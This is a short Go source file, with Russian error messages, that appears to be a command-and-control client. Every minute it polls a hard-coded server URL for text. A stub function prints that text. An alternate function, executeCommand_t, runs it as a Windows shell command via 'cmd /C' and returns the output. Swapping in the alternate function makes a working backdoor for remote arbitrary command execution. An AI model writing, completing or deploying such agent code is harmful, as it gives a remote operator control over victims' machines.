package main

import (
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"time"
)

const (
	serverURL = "http://example.com/"
	interval  = 1 * time.Minute
)

func main() {
	for {
		command, err := getCommandFromServer()
		if err != nil {
			fmt.Printf("Ошибка при получении команды: %v\n", err)
		} else {
			err = executeCommand(command)
			if err != nil {
				fmt.Printf("Ошибка при выполнении команды: %v\n", err)
			} else {
				fmt.Printf("Команда успешно выполнена: %s\n", command)
			}
		}

		time.Sleep(interval)
	}
}

func getCommandFromServer() (string, error) {
	resp, err := http.Get(serverURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func executeCommand(command string) error {
	fmt.Println("Executing command:", command)
	return nil
}

func executeCommand_t(command string) error {
	cmd := exec.Command("cmd", "/C", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("ошибка выполнения команды: %v, вывод: %s", err, output)
	}
	fmt.Printf("Вывод команды:\n%s\n", output)
	return nil
}
